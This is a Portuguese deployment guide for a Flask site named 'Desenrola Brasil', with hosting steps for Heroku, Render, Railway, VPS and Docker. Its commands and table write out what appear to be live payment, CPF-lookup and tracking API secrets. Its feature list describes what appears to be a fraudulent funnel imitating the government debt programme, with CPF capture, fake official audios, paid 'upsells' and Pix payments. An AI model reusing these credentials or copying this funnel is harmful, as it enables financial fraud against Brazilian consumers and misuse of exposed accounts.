# 🚀 Guia Completo de Hospedagem e Deploy - Desenrola Brasil

Este projeto está 100% pronto para ser hospedado em **qualquer plataforma** de nuvem, servidor VPS ou container Docker.

---

## 📋 Sumário
1. [Hospedagem no Heroku](#1-heroku)
2. [Hospedagem no Render (Opção Gratuita / Fácil)](#2-render)
3. [Hospedagem no Railway](#3-railway)
4. [Hospedagem em VPS Linux (Ubuntu / Debian)](#4-vps-linux-ubuntu--debian)
5. [Hospedagem com Docker / Coolify / CapRover](#5-docker--docker-compose)
6. [Execução Local (Windows / Mac / Linux)](#6-execução-local)
7. [Variáveis de Ambiente Necessárias](#7-variáveis-de-ambiente)

---

## 1. Heroku

O projeto já inclui o `Procfile`, `runtime.txt` e `requirements.txt` otimizados para o stack `Heroku-24` ou `Heroku-22`.

### Opção A: Pelo Terminal (Heroku CLI)
```bash
# 1. Login no Heroku
heroku login

# 2. Criar o app (se ainda não tiver criado)
heroku create seu-app-desenrola

# 3. Configurar variáveis de ambiente
heroku config:set SESSION_SECRET="desenrola_secret_key_2026_prod"
heroku config:set BRAVOPAY_SECRET_KEY="bp_live_9oTQegc-PM9LmscTLi6N3CdFHRxYYfsAIFR_LA"
heroku config:set AMNESIA_TOKEN="76418167-38e2-46aa-acf1-51ed15b4db9f"
heroku config:set UTMIFY_API_TOKEN="eieWvaCRVzozsag9MueRkZeCCh7ElqdvIaPL"

# 4. Fazer deploy
git push heroku main
```

### Opção B: Pelo Painel Web do Heroku
1. Crie uma nova aplicação no Dashboard do Heroku.
2. Na aba **Deploy**, conecte seu repositório GitHub.
3. Na aba **Settings** > **Reveal Config Vars**, adicione as variáveis:
   - `SESSION_SECRET`: `desenrola_secret_key_2026_prod`
   - `BRAVOPAY_SECRET_KEY`: `bp_live_9oTQegc-PM9LmscTLi6N3CdFHRxYYfsAIFR_LA`
   - `AMNESIA_TOKEN`: `76418167-38e2-46aa-acf1-51ed15b4db9f`
   - `UTMIFY_API_TOKEN`: `eieWvaCRVzozsag9MueRkZeCCh7ElqdvIaPL`
4. Clique em **Deploy Branch**.

---

## 2. Render (Recomendado & Muito Simples)

1. Acesse [render.com](https://render.com) e crie uma conta.
2. Clique em **New +** > **Web Service**.
3. Conecte seu repositório GitHub (ou faça upload do código).
4. Configure os campos:
   - **Name**: `desenrola-brasil`
   - **Environment**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `gunicorn main:app --bind 0.0.0.0:$PORT --workers 2 --timeout 120`
5. Em **Advanced** > **Environment Variables**, adicione as variáveis do tópico 7.
6. Clique em **Create Web Service**.

---

## 3. Railway

1. Acesse [railway.app](https://railway.app).
2. Clique em **New Project** > **Deploy from GitHub repo**.
3. O Railway detecta o `Procfile` e `Dockerfile` automaticamente.
4. Vá em **Variables** e adicione as variáveis de ambiente.
5. Em **Settings** > **Networking**, clique em **Generate Domain** para obter o link público com SSL automático.

---

## 4. VPS Linux (Ubuntu / Debian)

### Método A: Usando Docker Compose (Recomendado na VPS)
```bash
# 1. Instalar Docker e Docker Compose
curl -fsSL https://get.docker.com | sh

# 2. Descompactar o projeto na VPS
unzip desenrola_projeto_completo.zip -d /var/www/desenrola
cd /var/www/desenrola

# 3. Iniciar o container
docker compose up -d --build
```
Sua aplicação estará rodando na porta `5000`. Você pode apontar o Nginx com SSL grátis (Certbot) para ela.

### Método B: Usando Systemd + Gunicorn + Nginx
```bash
# 1. Instalar dependências do sistema
sudo apt update && sudo apt install -y python3 python3-pip python3-venv nginx

# 2. Extrair o projeto
mkdir -p /var/www/desenrola
unzip desenrola_projeto_completo.zip -d /var/www/desenrola
cd /var/www/desenrola

# 3. Criar ambiente virtual e instalar pacotes
python3 -m venv venv
./venv/bin/pip install --upgrade pip
./venv/bin/pip install -r requirements.txt

# 4. Criar serviço Systemd
sudo nano /etc/systemd/system/desenrola.service
```
Cole no arquivo `/etc/systemd/system/desenrola.service`:
```ini
[Unit]
Description=Desenrola Brasil Web App
After=network.target

[Service]
User=root
WorkingDirectory=/var/www/desenrola
Environment="PATH=/var/www/desenrola/venv/bin"
EnvironmentFile=/var/www/desenrola/.env
ExecStart=/var/www/desenrola/venv/bin/gunicorn main:app --bind 127.0.0.1:5000 --workers 3 --timeout 120
Restart=always

[Install]
WantedBy=multi-user.target
```
Inicie o serviço:
```bash
sudo systemctl daemon-reload
sudo systemctl start desenrola
sudo systemctl enable desenrola
```

Configurar Nginx (`/etc/nginx/sites-available/desenrola`):
```nginx
server {
    listen 80;
    server_name seudominio.com.br www.seudominio.com.br;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```
Ative e instale SSL gratuito:
```bash
sudo ln -s /etc/nginx/sites-available/desenrola /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d seudominio.com.br -d www.seudominio.com.br
```

---

## 5. Docker / Docker Compose

Para qualquer plataforma compatível com Docker (Coolify, Portainer, CapRover, AWS Lightsail, DigitalOcean App Platform):

```bash
# Construir a imagem
docker build -t desenrola-app .

# Executar o container
docker run -d -p 5000:5000 --env-file .env --name desenrola desenrola-app
```

---

## 6. Execução Local

### No Windows:
```cmd
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
python main.py
```

### No Mac / Linux:
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 main.py
```
Acesse em: `http://localhost:5001` (ou na porta definida no `.env`).

---

## 7. Variáveis de Ambiente

| Variável | Descrição | Exemplo |
| :--- | :--- | :--- |
| `PORT` | Porta onde o servidor escuta | `5000` ou `5001` |
| `SESSION_SECRET` | Chave secreta de sessão Flask | `desenrola_secret_key_2026_prod` |
| `BRAVOPAY_SECRET_KEY` | Chave secreta da API BravoPay | `bp_live_...` |
| `AMNESIA_TOKEN` | Token da API de consulta CPF | `76418167-38e2-...` |
| `UTMIFY_API_TOKEN` | Token da API Utmify | `eieWvaCRV...` |
| `FLASK_DEBUG` | Ativar/desativar modo debug | `False` |

---

## ✨ Recursos Já Integrados e Funcionais:
- **Redirecionamento Inteligente de Rota / Slugs Aleatórias**: Qualquer link aleatório ou erro 404 redireciona automaticamente para `/cpf` preservando os parâmetros de UTM.
- **Esteira de Upsells Sincronizada**:
  - Upsell 1: CND Cartório (R$ 68,47)
  - Upsell 2: Score Turbo (R$ 38,24)
  - Upsell 3: Multa Eleitoral (R$ 117,15)
  - Conclusão com Protocolo Federal
- **Redirecionamento Instantâneo Pós-Pix**: Redireciona em ~2.5 segundos após a aprovação do Pix.
- **Áudios Oficiais Atualizados**: Todos os áudios do atendimento informando o valor exato de R$ 148,37.
- **Rastreamento Multi-Pixel**:
  - Microsoft Clarity ativo em todos os templates (`yr9kea5f7e`).
  - TikTok Ads: Multi-Pixel com 6 pixels ativos (`pending_` e `paid_`).
  - TikTok CAPI (Server-Side) para eventos confiáveis.
  - Utmify: rastreamento completo de `waiting_payment` e `paid` em todas as etapas da esteira.
